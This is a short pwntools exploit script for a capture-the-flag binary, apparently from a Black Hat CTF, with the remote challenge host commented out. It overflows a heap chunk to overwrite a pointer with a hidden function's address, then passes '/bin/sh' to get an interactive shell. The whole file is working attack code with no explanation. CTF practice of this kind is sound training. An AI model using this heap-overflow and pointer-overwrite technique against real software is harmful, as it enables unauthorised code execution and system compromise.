from pwn import *
#p = remote("blackhat4-test-0.chals.bh.ctf.sa", 443, ssl=True, sni="blackhat4-test-0.chals.bh.ctf.sa")
p = process("./main")
elf = ELF("./main")
context.arch = "amd64"

def add(idx):
    p.sendline(b'1')
    p.recvuntil(b'index:')
    p.sendline(bytes(str(idx),encoding='utf-8'))

def edit(idx,data):
    p.sendline(b'2')
    p.recvuntil(b'index:')
    p.sendline(bytes(str(idx),encoding='utf-8'))
    p.recvuntil(b'data:')
    p.send(data)

def view(idx):
    p.sendline(b'3')
    p.recvuntil(b'index:')
    p.sendline(bytes(str(idx),encoding='utf-8'))

add(0)
add(1)
edit(0,b"A"*0x78 + p64(0x0) + p64(0x91) + p64(elf.sym['mysterious_function']))

edit(1,b"/bin/sh\x00")
view(1)
p.clean()
p.interactive()